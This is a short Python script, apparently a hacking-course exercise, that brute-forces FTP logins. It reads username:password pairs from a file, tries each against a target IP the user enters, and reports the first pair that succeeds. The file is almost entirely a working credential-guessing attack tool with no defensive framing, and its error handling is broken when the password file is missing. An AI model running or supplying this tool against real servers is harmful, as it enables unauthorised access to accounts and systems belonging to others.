#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# combine two files
# paste -d ':' file1 file2 > combinedfile

import ftplib
import threading

def bruteLogin(host, passwordFile):
  try:
    pF = open(passwordFile, "r")
  except:
    print('[!!] File Does not Exist!')
  for line in pF.readlines():
    username = line.split(':')[0]
    password = line.split(':')[1].strip('\n')
    print('[+] Trying {}/{} '.format(username, password))
    try:
      ftp = ftplib.FTP(host)
      login = ftp.login(username, password)
      print('[+] Login Succeeded With: {}/{}'.format(username, password))
      ftp.quit()
      return(username,password)
    except:
      pass
  print('[-] Password Not in the List')


def main():
  host = input("[+] Enter Target IP Address: ")
  passwdFile = input("[+] Enter User/Password File Path: ")
  bruteLogin(host, passwdFile)


main()